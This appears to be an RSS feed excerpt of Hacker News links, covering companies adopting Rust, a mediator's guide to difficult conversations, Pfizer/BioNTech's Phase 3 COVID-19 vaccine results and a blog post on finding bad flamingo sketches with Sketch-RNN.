<p>Rust has been a force multiplier for our team, and betting on Rust was one of the best decisions we made. More than performance, its ergonomics and focus on correctness has helped us tame sync’s complexity. We can encode complex invariants about our system in the type system and have the compiler check them for us. <a href="https://dropbox.tech/infrastructure/rewriting-the-heart-of-our-sync-engine">(Source)</a></p>
</blockquote><p>Read more about Dropbox’s use of Rust <a href="https://dropbox.tech/infrastructure/rewriting-the-heart-of-our-sync-engine">on their tech blog</a>.</p><h3 id="coursera">Coursera</h3><p><a href="https://www.coursera.org/">Coursera</a> uses Rust for their programming assignments feature where students need to write and run a computer program to solve a problem. The programs are run, tested, and graded inside Docker containers. For security reasons, the developer team needed to use a low-level language like Rust for some of the code, and they decided that Rust is more secure than C.</p><blockquote>
<p>Although C is the default low-level full-control programming language, these binaries have strict security and correctness requirements. We instead have chosen Rust, a modern native language from Mozilla. One of Rust’s common selling points is complete immunity to certain classes of security vulnerabilities thanks to its powerful type system, making it an excellent choice for security critical functions. <a href="https://medium.com/coursera-engineering/rust-docker-in-production-coursera-f7841d88e6ed">(Source)</a></p>
</blockquote><p>You can get more details on their use of Rust for programming assignments <a href="https://medium.com/coursera-engineering/rust-docker-in-production-coursera-f7841d88e6ed">on their blog</a>.</p><h3 id="figma">Figma</h3><p><img src="https://serokell.io/files/ru/rucki4yw.figma_(1).jpg" alt="Figma uses Rust" loading="lazy"></p><p><a href="https://www.figma.com/">Figma</a> is a collaborative web-based design tool for vector graphics and interface prototyping. They chose to rewrite their multiplayer syncing engine in Rust (previously, it was in TypeScript) to improve performance since their server couldn’t keep up with user growth.</p><blockquote>
<p>We chose Rust for this rewrite because it combines best-in-class speed with low resource usage while still offering the safety of standard server languages. Low resource usage was particularly important to us because some of the performance issues with the old server were caused by the garbage collector. <a href="https://www.figma.com/blog/rust-in-production-at-figma/">(Source)</a></p>
</blockquote><p>Find out more about Figma’s use of Rust <a href="https://www.figma.com/blog/rust-in-production-at-figma/">on their blog</a>.</p><h3 id="npm">npm</h3><p><a href="https://www.npmjs.com/">npm</a> is a package manager for JavaScript. Its engineering team chose to rewrite their main service in Rust because they saw that the service’s performance would soon be a bottleneck if user growth kept up. They rejected technologies such as C and C++ since they didn’t trust themselves to be able to handle memory management for a web-exposed service. Java was rejected since it would involve deploying JVM on their servers. 🙃</p><blockquote>
<p>The challenges that npm faces demand efficient and scalable solutions. When a service can be deploy-and-forget, that saves valuable operations time and lets them focus on other issues. npm employees also value having a helpful community around any technology they use. Rust fits all these criteria and is currently in use as part of npm’s stack. <a href="https://www.rust-lang.org/static/pdfs/Rust-npm-Whitepaper.pdf">(Source)</a></p>
</blockquote><p>To learn more, read their <a href="https://www.rust-lang.org/static/pdfs/Rust-npm-Whitepaper.pdf">case study</a> on Rust’s homepage.</p><h3 id="microsoft">Microsoft</h3><p><img src="https://serokell.io/files/jg/jgiu0cqd.microsoft_(1).jpg" alt="Microsoft uses Rust" loading="lazy"></p><p>Microsoft has recently been experimenting with integrating Rust into its large C/C++ codebases.</p><p>The main argument for adopting Rust at Microsoft was the memory safety that Rust provides. For the last 12 years, around 70 percent of the CVEs (Common Vulnerabilities and Exposures) discovered at Microsoft have been connected with memory safety. Microsoft has tried various options to solve this issue, such as extensive developer training and static analysis tools. However, it seems like the only way out is to make these vulnerabilities impossible to do.</p><p>For more info on Rust at Microsoft, watch this talk:</p><iframe width="560" height="315" src="https://www.youtube.com/embed/NQBVUjdkLAA" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen"></iframe><h3 id="cloudflare">Cloudflare</h3><p>Cloudflare uses Rust in their core edge logic and as a replacement for C, which is memory-unsafe.</p><p>Their <a href="https://github.com/cloudflare">GitHub</a> shows 18 open-source repositories that use Rust, and on their blog, they document using it for <a href="https://blog.cloudflare.com/how-we-made-firewall-rules/">Firewall Rules</a>, a very customizable firewall tool.</p><blockquote>
<p>With a mixed set of requirements of performance, memory safety, low memory use, and the capability to be part of other products that we’re working on like Spectrum, Rust stood out as the strongest option. <a href="https://blog.cloudflare.com/building-fast-interpreters-in-rust/">(Source)</a></p>
</blockquote><h3 id="facebook">Facebook</h3><p><img src="https://serokell.io/files/lr/lrxvkela.facebook_(1).jpg" alt="Facebook uses Rust" loading="lazy"></p><p>Facebook used Rust to rewrite its source control backend, which was written in Python. They were looking for a compiled language to rewrite it in and were attracted to Rust because of its safety benefits. Since then, Rust has been adopted by the source control team. As the reasons for adoption, they mention the huge cost of bugs for Facebook and the ease of the compiler feedback loop, in contrast to static analysis and code reviews.</p><blockquote>
<p>Rust detects large classes of serious bugs at compile time. The cost of a bug at compile time is orders of magnitude less than in production.</p>
</blockquote><iframe width="560" height="315" src="https://www.youtube.com/embed/kylqq8pEgRs" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen"></iframe><h3 id="amazon">Amazon</h3><p><a href="https://aws.amazon.com/">AWS</a> has used Rust for performance-sensitive components of services like Lambda, EC2, and S3. In addition, the company openly supports and sponsors the development of the language and its ecosystem.</p><p>Amazon also has open-sourced a service written entirely in Rust. <a href="https://firecracker-microvm.github.io/">Firecracker VMM</a> is a virtual machine monitor that was built for services like AWS Lambda and AWS Fargate.</p><h3 id="discord">Discord</h3><p><img src="https://serokell.io/files/uz/uzwkicp6.discord_(1).jpg" alt="Discord uses Rust" loading="lazy"></p><p><a href="https://discord.com/">Discord </a>uses Rust in multiple places of their codebase, both on the client- and the server-side.</p><p>For example, the team used Rust and <a href="https://serokell.io/blog/introduction-to-elixir">Elixir</a> to scale to 11 million concurrent users<a href="https://blog.discord.com/using-rust-to-scale-elixir-for-11-million-concurrent-users-c6f19fc029d3"> through the use of Elixir NIFs</a> (Native Implemented Functions). In this case, Rust enabled them to speed up their existing Elixir codebase while keeping everything memory safe.</p><p>They have also rewritten their Read States service in Rust (originally in Go). While the Go version of the service was fast enough most of the time, it sometimes had large latency spikes due to Go’s memory model and garbage collector.</p><p>To solve that, Discord switched to Rust, which offers a unique memory allocation system that makes garbage collection unnecessary.</p><blockquote>
<p>Along with performance, Rust has many advantages for an engineering team. For example, its type safety and borrow checker make it very easy to refactor code as product requirements change or new learnings about the language are discovered. Also, the ecosystem and tooling are excellent and have a significant amount of momentum behind them. <a href="https://blog.discord.com/why-discord-is-switching-from-go-to-rust-a190bbca2b1f">(Source)</a></p>
</blockquote><p>To read more about their use of Rust, check out <a href="https://blog.discord.com/why-discord-is-switching-from-go-to-rust-a190bbca2b1f">this article</a> on their blog.</p><h2 id="future-of-rust">Future of Rust</h2><p>In most of these companies, Rust functions as a strictly better alternative for C – you can see a visible pattern of rewrites done in Rust to escape performance degradation. Teams reach for it when they need extra performance but want to avoid memory issues associated with C.</p><p>But Rust has far more benefits: it makes lower-level programming more accessible, has excellent support for WASM, and is fantastic for concurrency. And I’m not even going to start to speak about the community. ❤️</p><p>In the future, expect Rust usage to increase as more and more companies discover how it can improve their codebases.</p><p>If you would like to learn more about Rust, I have compiled a quick introduction that you can check out <a href="https://serokell.io/blog/rust-guide">on our blog</a>. In the meantime, follow us on social media like <a href="https://twitter.com/serokell?lang=en">Twitter</a> and <a href="https://serokell.medium.com/">Medium</a> to see more posts about Rust and multiple other programming languages that we use in our daily work.</p></div></div>]]>
            </description>
            <link>https://serokell.io/blog/rust-companies</link>
            <guid isPermaLink="false">hacker-news-small-sites-25136222</guid>
            <pubDate>Wed, 18 Nov 2020 12:58:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Have a Difficult Conversation]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25136200">thread link</a>) | @MurizS
<br/>
November 18, 2020 | https://psyche.co/guides/use-mediation-techniques-to-overcome-the-muck-of-blame-and-anger | <a href="https://web.archive.org/web/*/https://psyche.co/guides/use-mediation-techniques-to-overcome-the-muck-of-blame-and-anger">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Iâ€™m in a Zoom meeting, speaking to a screen full of black squares, trying to coax voices out of the void. The other callers are all members of an executive board, and theyâ€™re in turmoil over the strategic direction of their company. Several of them are no longer on speaking terms, and employees and shareholders have not been shielded from the drama. On a good day, these calls are tense, but more often than not theyâ€™re explosive. Only my camera is turned on, and I watch myself try to look optimistic.</p>
<p>Iâ€™m a mediator. I have helped people have difficult conversations for more than 20 years: in conflict zones and in living rooms, with leaders of corporations and foundations, and people in my own community. If youâ€™ve ever avoided or postponed a difficult conversation, youâ€™re not alone. Conflict avoidance is everywhere. At home and at work, we steer around conflict as prodigiously as we create it.</p>
<p>And yet conflict isnâ€™t inherently bad. It offers us information about how we could work with others more effectively, improve our relationships, and grow as individuals. Itâ€™s far worse to try to avoid it, because you just end up creating new conflict â€“ which ends up being more insidious and costly than the original issue.</p>
<p>When I help people have difficult conversations, weâ€™re always aiming for one of three outcomes: a solution, a plan or an understanding. A solution is a grand bargain, a resounding win, a comprehensive resolution expected to withstand the pressures of all unknown future challenges. With a mediator this can happen, but itâ€™s ambitious. We all have a tendency to hope for a dramatic and permanent solution, but this usually causes new problems by overburdening an already stressed relationship. A plan is more realistic, and is like a map for finding a solution. It leaves the precise terms of the resolution open-ended but provides a path forward. A plan reorganises the relationship with new boundaries, revised norms, and sets up shared expectations for how the trickiest parts will be navigated.</p>
<p>But the <em>most</em> realistic outcome, especially at the beginning, is to focus on reaching an understanding. An understanding is a new awareness of what the other person has experienced in the conflict; itâ€™s a mutual appreciation for one anotherâ€™s needs, fears and hopes. Reaching an understanding is feasible, provides great relief, and can lay a foundation for a plan, a solution and a new relationship.</p>
<p>For example, I recently helped a family to reach an understanding when the COVID-19 pandemic forced a college student to move back in with his parents. They were having difficulties renegotiating their relationships once they were suddenly living together again. Their renewed understanding led to a plan for new expectations and boundaries, which theyâ€™re currently using to navigate the uncertainties and discomfort of this period. I expect theyâ€™ll find their solution soon.</p>
<p>In my work as a mediator, Iâ€™ve learnt that successful conversations always involve what I call a â€˜gem statementâ€™. When two parties have listened long and hard to each other â€“ have made the heroic effort to listen curiously and empathically even when they disagree strenuously â€“ someone eventually unearths a glowing, priceless gem. It usually takes the form of a short, powerful statement, such as these two Iâ€™ve heard recently:</p>
<blockquote>Weâ€™ve kept on fighting in part because neither of us is willing to walk away from this friendship. Thatâ€™s something.</blockquote>
<blockquote>Even when we canâ€™t agree on Dadâ€™s medical care, Iâ€™ve never doubted your good intentions. I know you want the best for him.</blockquote>
<p>It happens almost every time. From the muck of blame and anger, someone lifts out a beacon. I then seize the opportunity and hold up the gleaming gem for all parties to see. It lights the way toward a new conversation revolving around compromise, solutions and goodwill.</p>
<p>In addition to gratitude for the person who dug out the gem, I have also felt impatience. Iâ€™ve wondered, <em>Why canâ€™t they say something like this earlier in the process? Or better yet, at the beginning?</em> Does the conversation need to naturally find its way to such a moment, or could we engineer it to happen much sooner? It seemed worthwhile to find out, so I developed a process to reduce the amount of time people spend digging in the muck. And Iâ€™ve found it works: when people find a gem earlier on, they experience less pain and more benefit from having their difficult conversation.</p>
<p>This Guide is to help you do this â€“ without a mediator. Mediators can be helpful during challenging times, but we donâ€™t actually resolve peoplesâ€™ conflicts. We create the conditions in which people feel heard and acknowledged, increasing the quality of their communication and problem-solving. When youâ€™re facing a tough conversation, itâ€™s not really the mediator you need â€“ itâ€™s the conditions weâ€™re good at creating and maintaining.</p>
<p>If you donâ€™t feel safe or if your situation involves illegal activity or any type of abuse, this Guide isnâ€™t right for you. In those instances, get help from a professional right away. There are also some situations that donâ€™t call for further conversation â€“ some relationships or difficulties are better left in the past, and you should trust your instinct about whether a conversation is the right step for you. But if you think talking could do some good, then this resource can help get you started.</p>
<p>Maybe you feel misunderstood or unappreciated at work. Or maybe youâ€™re caught in a recurring family pattern that causes pain and drives you <a href="https://psyche.co/guides/a-family-rift-is-locked-on-the-past-heres-how-to-move-forward" rel="noopener">away</a> from the people you love. If you feel hurt or angry when thinking of a difficult conversation you need to have, there is a good chance that the relationship is important to you. Whether itâ€™s a relationship within your family, at work or in your community, itâ€™s become this challenging because you have a vested interest, you care deeply or your future is somehow intertwined with the person you need to talk with.</p>
<p>If you feel the situation could improve if someone <em>really heard</em> what you have to say, thereâ€™s hope. If you feel ready to make an earnest effort to <em>really hear</em> someone in return, thereâ€™s even more than hope. Remember that your goal here is not to find a quick solution or plan straight away â€“ thatâ€™s tempting but unrealistic, and might backfire. Your goal is to understand each other.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p><strong>1. Prepare for the conversation</strong></p>
<p>The first step is a thought experiment: think about the person with whom you need to talk, and allow yourself to imagine that you just finished having the best possible conversation with them. You were heard fully. Each of your concerns was addressed to your satisfaction. If an apology was appropriate, you received an excellent one. <em>Stay with this â€“ just imagine it!</em> Youâ€™ve reached an understanding that gives you confidence in the future of the relationship. <em>This is a challenging thought experiment, but youâ€™re almost thereâ€¦</em> You are relieved, you feel lighter, and even grateful to the person youâ€™ve been in conflict with.</p>
<p><strong>2. Dig out a gem</strong></p>
<p>What would you say to them in this moment? (Remember, in this exercise youâ€™ve been heard, youâ€™ve received an apology, and it went exceedingly well.) What would you say to your counterpart if all of that happened? Whatâ€™s â€˜underneathâ€™ the conflict? Whatâ€™s true when youâ€™re not consumed with negative feelings? Write down the first gem statement you think of. You can write others too, but usually the first one is the real deal.</p>
<p>Your statement should be an authentic expression of how youâ€™re feeling, but should also have significant meaning and positive impact for the other person. For example, two more gem statements I heard recently were: â€˜I can tell you care a lot about reaching our teamâ€™s goals, and I have a lot of respect for you<em>.</em>â€™ You can tell itâ€™s a gem when youâ€™re terribly tempted to tack on a grievance to the end of it. Like this: <em>I can tell you care a lot about reaching our teamâ€™s goals, </em><em><strong>but the way you go about it is causing great difficulty to everyone around you.</strong></em> If you find yourself doing this, leave out the second part. Youâ€™ll get to say it, just not here.</p>
<p><strong>3. Ask yourself if youâ€™re ready</strong></p>
<p>Are you willing to say the statement to them? We recoil from being generous and kind when we feel our counterpart doesnâ€™t deserve it. Moreover, making such statements can put us in an even more vulnerable position. If thatâ€™s the case, it might help to think of this another way. Uttering your gem statement is a temporary discomfort; the benefits youâ€™ll experience will be lasting and profound.</p>
<p>At this point, you should share this Guide with the other person. Even if you donâ€™t follow these steps closely or have the conversation right away, it will be helpful simply to both read the Guide and give thought to it. If you do proceed with a conversation, having this Guide in advance means that they will have undertaken this same process and unearthed a gem statement for you, which will likely mitigate your vulnerability and discomfort.</p>
<p><strong>4. Phone a friend</strong></p>
<p>Tell a friend who isnâ€™t involved in the conversation what youâ€™re going to do. The purpose is not to craft the gem statement together, and it isnâ€™t even to get their advice. Instead, say the four sentences below to your friend:</p><ul>
<li>The biggest emotion that Iâ€™m feeling toward the person I need to have a difficult conversation with isâ€¦</li>
<li>The biggest emotion that I expect the person is feeling toward me isâ€¦</li>
<li>The gem statement I will make to them isâ€¦</li>
<li>My hope for the conversation isâ€¦</li>
</ul><p>The fourth sentence â€“ identifying your hope for the conversation â€“ is a critical piece of your planning. Remember that the best initial outcome is achieving a new, shared understanding, rather than a comprehensive solution or a detailed plan. New understanding can bring you relief and allow space for forward movement, without expecting a miraculous resolution of all tension and …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/use-mediation-techniques-to-overcome-the-muck-of-blame-and-anger">https://psyche.co/guides/use-mediation-techniques-to-overcome-the-muck-of-blame-and-anger</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/use-mediation-techniques-to-overcome-the-muck-of-blame-and-anger</link>
            <guid isPermaLink="false">hacker-news-small-sites-25136200</guid>
            <pubDate>Wed, 18 Nov 2020 12:55:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pfizer and BioNTech Conclude Phase 3 Study of Covid-19 Vaccine Candidate]]>
            </title>
            <description>
<![CDATA[
Score 262 | Comments 171 (<a href="https://news.ycombinator.com/item?id=25135984">thread link</a>) | @doener
<br/>
November 18, 2020 | https://investors.biontech.de/news-releases/news-release-details/pfizer-and-biontech-conclude-phase-3-study-covid-19-vaccine | <a href="https://web.archive.org/web/*/https://investors.biontech.de/news-releases/news-release-details/pfizer-and-biontech-conclude-phase-3-study-covid-19-vaccine">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="block-nir-pid3469-content">
  
    
      <h2>

</h2>





<article role="article">

  <div>
                <ul><li><em>Primary efficacy analysis demonstrates BNT162b2 to be 95% effective against COVID-19 beginning 28 days after the first dose; 170 confirmed cases of COVID-19 were evaluated, with 162 observed in the placebo group versus 8 in the vaccine group</em></li><li><em>Efficacy was consistent across age, gender, race and ethnicity demographics; observed efficacy in adults over 65 years of age was over 94%</em></li><li><em>Safety data milestone required by U.S. Food and Drug Administration (FDA) for Emergency Use Authorization (EUA) has been achieved</em></li><li><em>Data demonstrates vaccine was well tolerated across all populations with over 43,000 participants enrolled; no serious safety concerns observed; the only Grade 3 adverse event greater than 2% in frequency was fatigue at 3.8% and headache at 2.0%</em></li><li><em>Companies plan to submit within days to the FDA for EUA and share data with other regulatory agencies around the globe</em></li><li><em>The companies expect to produce globally up to 50 million vaccine doses in 2020 and up to 1.3 billion doses by the end of 2021</em></li></ul><p><strong>NEW YORK and MAINZ, GERMANY, November 18, 2020</strong> — <a href="https://www.globenewswire.com/Tracker?data=Yli2d5nvthuV5tgeZIpzfNa66X9aMWyRcb2c3eYCC7LVUbfEPTAS5qEjoWW9lex6gtFcZvarKhgdJF9WTS1yog==" rel="nofollow" target="_blank"><u>Pfizer Inc.</u></a> (NYSE: PFE) and <a href="https://www.globenewswire.com/Tracker?data=hDf010SOKY9ImJTMfLoYkeqr7USo3RbkSJXZNMRX8mlCKyHr1c2F9DT9mjo9LMT6ewFhRCEzViCxu4yA2e7l7g==" rel="nofollow" target="_blank"><u>BioNTech SE</u></a> (Nasdaq: BNTX) today announced that, after conducting the final efficacy analysis in their ongoing Phase 3 study, their mRNA-based COVID-19 vaccine candidate, BNT162b2, met all of the study’s primary efficacy endpoints. Analysis of the data indicates a vaccine efficacy rate of 95% (p&lt;0.0001) in participants without prior SARS-CoV-2 infection (first primary objective) and also in participants with and without prior SARS-CoV-2 infection (second primary objective), in each case measured from 28 days after the first dose, 7 days after the second dose. The first primary objective analysis is based on 170 cases of COVID-19, as specified in the study protocol, of which 162 cases of COVID-19 were observed in the placebo group versus 8 cases in the BNT162b2 group. Efficacy was consistent across age, gender, race and ethnicity demographics. The observed efficacy in adults over 65 years of age was over 94%.</p>  <p>There were 10 severe cases of COVID-19 observed in the trial, with nine of the cases occurring in the placebo group and one in the BNT162b2 vaccinated group. To date, the Data Monitoring Committee for the study has not reported any serious safety concerns related to the vaccine. A review of unblinded reactogenicity data from the final analysis which consisted of a randomized subset of at least 8,000 participants 18 years and older in the Phase 2/3 study demonstrates that the vaccine was well tolerated, with most solicited adverse events resolving shortly after vaccination. The only Grade 3 (severe) solicited adverse events greater than or equal to 2% in frequency after the first or second dose were fatigue at 3.8% and headache at 2.0% following dose 2. Consistent with earlier shared results, older adults tended to report fewer and milder solicited adverse events following vaccination. </p>  <p>In addition, the companies announced that the safety milestone required by the U.S. Food and Drug Administration (FDA) for Emergency Use Authorization (EUA) has been achieved. Pfizer and BioNTech plan to submit a request within days to the FDA for an EUA based on the totality of safety and efficacy data collected to date, as well as manufacturing data relating to the quality and consistency of the vaccine. These data also will be submitted to other regulatory agencies around the world.</p>  <p>“The study results mark an important step in this historic eight-month journey to bring forward a vaccine capable of helping to end this devastating pandemic. We continue to move at the speed of science to compile all the data collected thus far and share with regulators around the world,” said <strong>Dr. Albert Bourla, Pfizer Chairman and CEO</strong>. “With hundreds of thousands of people around the globe infected every day, we urgently need to get a safe and effective vaccine to the world.” </p>  <p>“We are grateful that the first global trial to reach the final efficacy analysis mark indicates that a high rate of protection against COVID-19 can be achieved very fast after the first 30 µg dose, underscoring the potential of BNT162 to provide early protection,” said <strong>Ugur Sahin, M.D., CEO and Co-founder of BioNTech</strong>. “These achievements highlight the potential of mRNA as a new drug class. Our goal from the very beginning was to design and develop a vaccine that would generate rapid and potent protection against COVID-19 with a benign tolerability profile across all ages. We believe we have&nbsp;successfully accomplished this with our vaccine candidate BNT162b2 in all age groups studied so far and look forward to sharing further details with the regulatory authorities. I want to thank all the devoted women and men who contributed to this historically unprecedented achievement. We will continue to work with our partners and governments around the world to prepare for global distribution in 2020 and beyond.”</p>  <p>The Phase 3 clinical trial of BNT162b2 began on July 27 and has enrolled 43,661 participants to date, 41,135 of whom have received a second dose of the vaccine candidate as of November 13, 2020. Approximately 42% of global participants and 30% of U.S. participants have racially and ethnically diverse backgrounds, and 41% of global and 45% of U.S. participants are 56-85 years of age. A breakdown of the diversity of clinical trial participants can be found <a href="https://www.globenewswire.com/Tracker?data=ad78-V3TIZpaI0hRxmiSbgkEJUyAXaiiyEL-ARI3BmSe5nBb577HWGg9iwQLkpFDr5Zut3MDUXtDp4gcUuk1TJMOdJQMV0I0rP8L9ghyxUs=" rel="nofollow" target="_blank"><u>here</u></a><u>&nbsp;</u>from approximately 150 clinical trials sites in United States, Germany, Turkey, South Africa, Brazil and Argentina. The trial will continue to collect efficacy and safety data in participants for an additional two years. </p>  <p>Based on current projections, the companies expect to produce globally up to 50 million vaccine doses in 2020 and up to 1.3 billion doses&nbsp;by the end of 2021. Four of Pfizer’s facilities are part of the manufacturing and supply chain; St. Louis, MO; Andover, MA; and Kalamazoo, MI in the U.S.; and Puurs in Belgium. BioNTech’s German sites will also be leveraged for global supply.</p>  <p>Pfizer is confident in its vast experience, expertise and existing cold-chain infrastructure to distribute the vaccine around the world. The companies have developed specially designed, temperature-controlled thermal shippers utilizing dry ice to maintain temperature conditions of -70°C±10°C. They can be used be as temporary storage units for 15 days by refilling with dry ice. Each shipper contains a GPS-enabled thermal sensor to track the location and temperature of each vaccine shipment across their pre-set routes leveraging Pfizer’s broad distribution network.</p>  <p>Pfizer and BioNTech plan to submit the efficacy and safety data from the study for peer-review in a scientific journal once analysis of the data is completed.</p>  <p><strong>About Pfizer: Breakthroughs That Change Patients’ Lives</strong><br>At Pfizer, we apply science and our global resources to bring therapies to people that extend and significantly improve their lives. We strive to set the standard for quality, safety and value in the discovery, development and manufacture of health care products, including innovative medicines and vaccines. Every day, Pfizer colleagues work across developed and emerging markets to advance wellness, prevention, treatments and cures that challenge the most feared diseases of our time. Consistent with our responsibility as one of the world's premier innovative biopharmaceutical companies, we collaborate with health care providers, governments and local communities to support and expand access to reliable, affordable health care around the world. For more than 150 years, we have worked to make a difference for all who rely on us. We routinely post information that may be important to investors on our website at <a href="https://www.globenewswire.com/Tracker?data=efkBESitL-YYL3Z0laTvow2llGFscFffkJd5BwOiTNGOtjFDXsnDOMTTrrWjwIHkGrKr7l170Vr-Cf0IOcmK5A==" rel="nofollow" target="_blank"><u>www.Pfizer.com</u></a>. In addition, to learn more, please visit us on <a href="https://www.globenewswire.com/Tracker?data=efkBESitL-YYL3Z0laTvo2zbdJuTNF9-WfK2D7Q6C5GUvy5ow-iKwQsyx4ZETtqc0zENUzOZqpNT5axWduuvIg==" rel="nofollow" target="_blank"><u>www.Pfizer.com</u></a> and follow us on Twitter at <a href="https://www.globenewswire.com/Tracker?data=_G7bMvP0UnHgRNdBi7C58Y5yD_vt1MwKM6uavr4WH8J9GONODA3QgMnza1EVMOxj60PNXXgeMmkscyRk7kz9qg==" rel="nofollow" target="_blank"><u>@Pfizer</u></a> and <a href="https://www.globenewswire.com/Tracker?data=_G7bMvP0UnHgRNdBi7C58aDSWJrj99jYJyKkvw72mTcupprjbYWTE_o_8oUmeQOe0zPfz4E2RmC-oF4TaVBRlXH8iP_6Bix5Xu9JnlN_J7M=" rel="nofollow" target="_blank"><u>@Pfizer News</u></a>, <a href="https://www.globenewswire.com/Tracker?data=33yxYtC2I0K4tZPfGski5s3o4ZHP3agvfitL54fVKSjNuaz9dJMbcS2fs_yowRkoI0H6GkHJ-V8eJS481Br7O_HudP6nCQCn8GgLiQR8_ao=" rel="nofollow" target="_blank"><u>LinkedIn</u></a>, <a href="https://www.globenewswire.com/Tracker?data=wDqRtJtHVFLrdnoY4rjV_QUVojDDDSL9NIZNQLhPL9rquT_S_TQq6AO4do7dxb91mS86msyzNiDLUOTenvwXSw==" rel="nofollow" target="_blank"><u>YouTube</u></a> and like us on Facebook at <a href="https://www.globenewswire.com/Tracker?data=dksh0JnhdKBurO_iVOmXvoO4yOIddjXTCsCPmWuYLjSsFuZnBZqF1BL6C2m7YnFEj37K3VlD2qyWE_dSx5HscHETzEHDKFBMIAuvMoaa-uE=" rel="nofollow" target="_blank"><u>Facebook.com/Pfizer</u></a>.</p>  <p><strong>Pfizer Disclosure Notice</strong><br>The information contained in this release is as of November 18, 2020. Pfizer assumes no obligation to update forward-looking statements contained in this release as the result of new information or future events or developments.</p>  <p>This release contains forward-looking information about Pfizer’s efforts to combat COVID-19, the collaboration between BioNTech and Pfizer to develop a potential COVID-19 vaccine, the BNT162 mRNA vaccine program, and modRNA candidate BNT162b2 (including qualitative assessments of available data, potential benefits, expectations for clinical trials, anticipated timing of regulatory submissions and anticipated manufacturing, distribution and supply), that involves substantial risks and uncertainties that could cause actual results to differ materially from those expressed or implied by such statements. Risks and uncertainties include, among other things, the uncertainties inherent in research and development, including the ability to meet anticipated clinical endpoints, commencement and/or completion dates for clinical trials, regulatory submission dates, regulatory approval dates and/or launch dates, as well as risks associated with clinical data (including the Phase 3 data that is the subject of this release), including the possibility of unfavorable new preclinical or clinical trial data and further analyses of existing preclinical or clinical trial data; the ability to produce comparable clinical or other results, including the rate of vaccine effectiveness and safety and tolerability profile observed to date, in additional analyses of the Phase 3 trial or in larger, more diverse populations upon commercialization; the risk that clinical trial data are subject to differing interpretations and assessments, including during the peer review/publication process, in the scientific community generally, and by regulatory authorities; whether and when data from the BNT162 mRNA vaccine program will be published in scientific journal publications and, if so, when and with what modifications; whether …</p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://investors.biontech.de/news-releases/news-release-details/pfizer-and-biontech-conclude-phase-3-study-covid-19-vaccine">https://investors.biontech.de/news-releases/news-release-details/pfizer-and-biontech-conclude-phase-3-study-covid-19-vaccine</a></em></p>]]>
            </description>
            <link>https://investors.biontech.de/news-releases/news-release-details/pfizer-and-biontech-conclude-phase-3-study-covid-19-vaccine</link>
            <guid isPermaLink="false">hacker-news-small-sites-25135984</guid>
            <pubDate>Wed, 18 Nov 2020 12:24:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Finding bad flamingo drawings with recurrent neural networks]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25135848">thread link</a>) | @swyx
<br/>
November 18, 2020 | https://colinmorris.github.io/blog/bad_flamingos | <a href="https://web.archive.org/web/*/https://colinmorris.github.io/blog/bad_flamingos">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <article itemscope="" itemtype="http://schema.org/BlogPosting">

    
  
  

  <div itemprop="articleBody">
    <p>Have you played <a href="https://quickdraw.withgoogle.com/">Quick, Draw!</a> yet? It’s basically Pictionary, played against a neural network, and it’s a lot of fun. Not long ago, Google released a <a href="https://github.com/googlecreativelab/quickdraw-dataset">dataset</a> of some of the millions of sketches people have drawn so far over 345 categories.</p>

<p>In this post, I’ll just be looking at sketches in the ‘flamingo’ category. You can browse a random sample <a href="https://quickdraw.withgoogle.com/data/flamingo">here</a>. Some of them are lovely.</p>

<figure>
<img src="https://colinmorris.github.io/assets/quickdraw/svgs/nice_flamingos.svg">
</figure>

<p>Others, well…</p>

<figure>
<img src="https://colinmorris.github.io/assets/quickdraw/svgs/nonnice_flamingo.svg">
<figcaption>
It's, um, a viking ship with a chicken carved into the prow?
</figcaption>
</figure>

<p>What if we want to automatically identify the jankiest flamingos in the dataset?</p>

<h2 id="sketch-rnn-as-probability-estimator">Sketch-RNN as probability estimator</h2>

<p>Along with the datasets, Google has released some <a href="https://github.com/tensorflow/magenta/tree/master/magenta/models/sketch_rnn#pre-trained-models">pre-trained models</a> that use the Sketch-RNN architecture described in <a href="https://arxiv.org/abs/1704.03477">this paper</a>.</p>

<p>These models were trained to generate new sketches. For example:</p>

<figure>
<img src="https://colinmorris.github.io/assets/quickdraw/svgs/generated_flamingos.svg">
</figure>

<p>But we can also repurpose them to get some insight into existing human-generated sketches. As I talked about in an earlier post on <a href="http://colinmorris.github.io/blog/dreaming-rbms">character-level RBMs</a>, learning to generate new examples of X is basically the same as learning the probability distribution of X.</p>

<p>So in addition to sampling from the learned distribution to generate new sketches, we can take existing sketches, and ask the model how probable it thinks they are. It seems reasonable that the sketches the model assigns the lowest probabilities should be among the ‘worst’.</p>

<h2 id="good-flamingos">Good flamingos</h2>

<p>Before we roast Quickdraw’s least gifted flamingo-drawers, let’s look at some of the ‘best’ flamingo sketches - i.e. those assigned the highest probabilities:</p>

<figure>
    <img src="https://colinmorris.github.io/assets/quickdraw/svgs/flamingo_best.svg">
</figure>

<p>Audubon they ain’t, but these are at least mostly recognizable as flamingos. Because we’re ranking by probability, we should in some sense expect the most ‘typical’ sketches here, rather than the most beautiful.</p>

<h2 id="bad-flamingos">Bad flamingos</h2>

<p>To quote Tolstoy, <i>happy flamingos are all alike, but every garbage flamingo is garbage in its own way</i>.</p>

<p>We can broadly classify our worst birds into a few groups.</p>

<h3 id="well-intentioned-but-frankly-awful">Well-intentioned but frankly awful</h3>

<p>God bless these artists, they really tried.</p>



